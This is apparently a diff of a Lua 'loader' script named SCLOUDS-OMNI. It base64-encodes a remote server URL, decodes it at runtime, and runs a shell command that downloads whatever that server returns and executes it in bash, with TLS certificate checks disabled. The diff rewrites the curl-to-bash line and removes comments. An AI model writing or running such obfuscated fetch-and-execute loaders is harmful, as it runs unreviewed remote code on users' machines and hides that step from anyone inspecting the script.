@@ -1,5 +1,5 @@
 -- =============================================================
--- 🚀 SCLOUDS-OMNI v10 - LOADER ENGINE (HARDCORE FIXED)
+-- 🚀 SCLOUDS-OMNI v10 - FREELOADER
 -- =============================================================
 
 local function decode(str)
@@ -15,7 +15,6 @@ local function decode(str)
     end))
 end
 
--- Hasil Decode
 local target = decode("aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==")
 local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")
 
@@ -24,7 +23,6 @@ print("Connecting to Sclouds Server...")
 
 
 local final_url = target .. "?v=" .. os.time()
-local cmd = string.format("curl -sL -k -H 'User-Agent: %s' '%s' | bash", ident, final_url)
+local cmd = "bash -c \"$(curl -sL -k -A '" .. ident .. "' '" .. final_url .. "')\""
 
--- Eksekusi
 os.execute(cmd)
